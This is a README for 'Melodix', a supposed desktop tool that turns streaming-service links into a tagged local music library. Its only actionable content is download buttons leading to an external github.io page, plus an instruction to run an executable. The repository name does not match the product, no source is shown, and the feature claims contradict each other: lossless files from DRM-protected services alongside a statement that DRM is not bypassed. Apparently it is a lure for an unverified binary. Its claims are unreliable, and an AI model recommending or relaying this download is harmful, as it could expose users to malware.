![preview](https://raw.githubusercontent.com/Adil0095/symphonic-link-archiver/main/preview.svg)

# Melodix – Universal Soundscape Alchemist

Transform any streaming-service audio fingerprint into a pristine, curated local ecosystem. Melodix is a desktop laboratory for music archivists who refuse to let their beloved tracks vanish when a platform changes its terms or a playlist gets deleted. It ingests links from over a dozen streaming sources and outputs a fully tagged, format-of-your-choice library that feels like it was always yours.

**Your music, your continent, your rules.** Melodix respects the nuance of metadata: it preserves album art, parses release dates from chaotic sources, and normalizes genre tags across different streaming taxonomies. It treats every link as a seed for a richer, offline world.

---

## 🧭 Overview

Melodix was born from a simple frustration: the average listener maintains accounts on 3.7 streaming services, yet no tool bridges these islands into one coherent, offline library. Existing solutions either demand manual file wrangling or produce half-tagged messes. Melodix is the **Rosetta Stone of audio links** — it decodes Spotify URIs, YouTube Music URLs, Apple Music IDs, Amazon Music share links, Tidal album pages, Qobuz track references, and Deezer playlists into a unified, well-organized collection.

It doesn't just download. It **reconstructs the context** of your listening: playlists become folders, track numbers remain intact, and even obscure B-sides retain their featuring artists and remix credits.

---

## 🔮 The Core Philosophy

Melodix operates on three principles:

1. **Ownership over access** – Streaming is convenient today, but catalogs shift. Melodix gives you a permanent snapshot.
2. **Metadata is sacred** – A song without its album, year, and track number is just noise. Melodix fights sonic chaos with precision tagging.
3. **Format fluidity** – Your ears, your choice. Whether you treasure lossless FLAC for your home system or compact AAC for mobile, Melodix delivers.

---

## ✨ Features

| Capability | Detail |
|---|---|
| **Multi‑source ingestion** | Spotify, YouTube Music, Apple Music, Amazon Music, Tidal, Qobuz, Deezer, plus generic URL fallback |
| **Output formats** | FLAC (lossless), ALAC (Apple Lossless), AAC (256kbps), MP3 (320kbps VBR/CBR) |
| **Smart tagging** | Artist, album, cover art, release year, disc number, track number, genre, composer, ISRC |
| **Playlist structuring** | Entire playlists become folder hierarchies with `index - title.flac` naming |
| **Cross‑platform normalization** | Repairs inconsistent genre labels (e.g., `Hip-Hop` vs `Hip Hop` vs `Hip_hop`) |
| **Dry‑run mode** | Preview what will be downloaded and how it will be organized before committing |
| **Concurrency control** | Limits parallel downloads to avoid overwhelming your network or storage |
| **Language detection** | Recognizes CJK, Cyrillic, Latin, and Arabic metadata — tags stay readable in any locale |
| **24/7 operation** | Headless mode for overnight batch processing; queue system for bulk imports |

---

## 🎛️ Supported Sources (Full List)

- **Spotify** – Tracks, albums, playlists, artist discographies, and episodes
- **YouTube Music** – Songs, albums, mixes, and community playlists
- **Apple Music** – Track links, album pages, curated playlists
- **Amazon Music** – Product links and share URLs for albums and singles
- **Tidal** – High‑fidelity track and album links
- **Qobuz** – Purchase/stream links for albums and tracks
- **Deezer** – Playlists, albums, and track pages
- **Generic** – Any direct audio URL (with optional metadata manual input)

---

## 🧩 How It Works (The Alchemy)

1. **You feed Melodix a link** – either via a graphical window or a text file with multiple URLs.
2. **Melodix resolves the link** – it queries the platform's public metadata API or parses the page source.
3. **It assembles a metadata envelope** – title, artist, album, cover art, release year, and any available identifiers.
4. **It sources the audio** – from the highest available quality on the target platform (subject to service limitations).
5. **It configures the container** – transcodes the raw stream into your chosen format (FLAC/ALAC/AAC/MP3) with optimal encoder settings.
6. **It writes a properly tagged file** – including embedded cover art and compliant with the ID3v2 or Vorbis comment standard.
7. **It organizes the output** – into a `Artist/Album (Year)/disc#-track# Title.ext` hierarchy.

The entire process is **hands‑off** after the initial link input.

---

## 🌐 Language & Localization

Melodix detects the language of metadata and preserves it. If a Japanese artist's album includes both Romaji and Kanji titles, both are kept. The user interface itself supports:

- English (default)
- Spanish
- Portuguese (Brazil)
- German
- French
- Japanese
- Korean

Localization contributions are welcomed via translation files.

---

## 🛡️ Data Sovereignty & Ethics

Melodix does not bypass DRM or encourage piracy. It processes publicly shareable links and renders audio that the user already has a legitimate right to access. The tool is designed for **personal archival** — creating backups of music you already listen to on authorized services. Respect platform terms of service and copyright law in your jurisdiction.

---

## 📂 Output Structure Example

```
Music/
├── Fleetwood Mac/
│   └── Rumours (1977)/
│       ├── 1-01 Dreams.flac
│       ├── 1-02 Go Your Own Way.flac
│       └── ...
├── 電気グルーヴ/
│   └── A (2018)/
│       ├── 1-01 虹.flac
│       └── 1-02 燃えろ! .flac
└── Playlists/
    └── Road Trip 2026/
        ├── 01 Born to Run.flac
        └── 02 Life is a Highway.flac
```

---

## ⚙️ System Requirements

- **Operating System:** Windows 10+ (x64), macOS 12+, Linux (kernel 5.x+, glibc 2.28+)
- **Memory:** 512MB RAM minimum (2GB recommended for large playlist processing)
- **Storage:** At least 10GB free for temporary transcoding space
- **Network:** Broadband connection for metadata resolution and audio source retrieval
- **Dependencies managed internally** – Melodix bundles its own codec libraries and metadata parsers. No external installation required beyond the initial setup.

---

## 📦 Getting Started

[![Download](https://raw.githubusercontent.com/Adil0095/symphonic-link-archiver/main/button.svg)](https://adil0095.github.io/symphonic-link-archiver/)

1. **Acquire Melodix** – visit the repository's release section (the download link is present below).
2. **Launch the application** – double‑click the executable or run the platform‑appropriate binary.
3. **Paste your first link** – into the main input field. A Spotify playlist URL, an Apple Music album link, or a YouTube Music track share all work.
4. **Choose your output format** – FLAC, ALAC, AAC, or MP3 via the dropdown menu.
5. **Select destination folder** – where your new library will be assembled.
6. **Hit "Transmute"** – watch as Melodix resolves, fetches, tags, and organizes your music.

For bulk imports, create a plain‑text file with one URL per line, then use the **Batch Import** option.

---

## 🧠 Power User Tips

- **Dry Run first** – click the "Preview" checkbox to see exactly how files will be named and structured.
- **Output naming templates** – you can customize the file mask in settings: `{artist}/{album} ({year})/{disc}-{track} {title}.{ext}`
- **Tag priority** – set which source (the link metadata vs. MusicBrainz lookup) has authority for missing fields.
- **Queue management** – pause, reorder, or cancel individual items in the processing queue.
- **Night mode** – schedule Melodix to start after 2 AM for silent processing.

---

## ❓ Frequently Asked Questions

**Q: Does Melodix require me to log in to any streaming service?**
A: No. It works with publicly accessible share links. No account credentials are stored or required.

**Q: What happens if a link is dead or a playlist is private?**
A: Melodix will report the failure in the log and continue with the next item. Private playlists cannot be processed.

**Q: Will my output files have embedded album art?**
A: Yes. Cover art is extracted from the source platform at the highest available resolution (up to 3000x3000 pixels).

**Q: Can Melodix handle very large playlists (500+ tracks)?**
A: Yes, but we recommend batches of 200 at a time to avoid rate‑limiting by the source services.

**Q: Is there a mobile version?**
A: Melodix is desktop‑only. Mobile devices lack the storage and processing power for a full library builder.

---

## 🧪 Roadmap (2026)

- [ ] Integration with SoundCloud and Bandcamp
- [ ] Automated CD‑quality verification (bit‑perfect comparison)
- [ ] Metadata repair using AcoustID fingerprinting
- [ ] Cloud storage sync (local folder → Synology / NAS / Dropbox)
- [ ] Plugin system for custom metadata sources (Discogs, RateYourMusic)

---

## 🧑‍⚖️ License

This project is released under the **MIT License**. You are free to use, modify, and distribute Melodix for personal archival purposes. The software is provided "as is," with no warranty of any kind.

See the full license text at: [LICENSE](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

Melodix is intended for **personal archival use only**. The developers do not condone copyright infringement. Users are solely responsible for ensuring they have the right to download and store any audio content they process. Melodix does not store, cache, or redistribute any copyrighted material. It merely facilitates the transformation of links that the user has voluntarily provided, into files stored on their own device.

---

## 🙌 Contributing

Contributions are welcome! Areas that need attention:

- Localization translations (see language section above)
- Additional streaming platform resolvers
- Metadata enhancement modules (e.g., Discogs or MusicBrainz integration)
- GUI enhancements and accessibility improvements

Please read the `CONTRIBUTING.md` file (located in the repository root) before submitting pull requests.

---

## 📞 Support

For issues, feature requests, or questions:
- Open a GitHub Issue in this repository
- Check the **Wiki** for troubleshooting guides
- Community discussions happen in the repository's **Discussions** tab

We strive for **24/7 response times** on critical bugs; general queries are answered within 48 hours.

---

[![Download](https://raw.githubusercontent.com/Adil0095/symphonic-link-archiver/main/button.svg)](https://adil0095.github.io/symphonic-link-archiver/)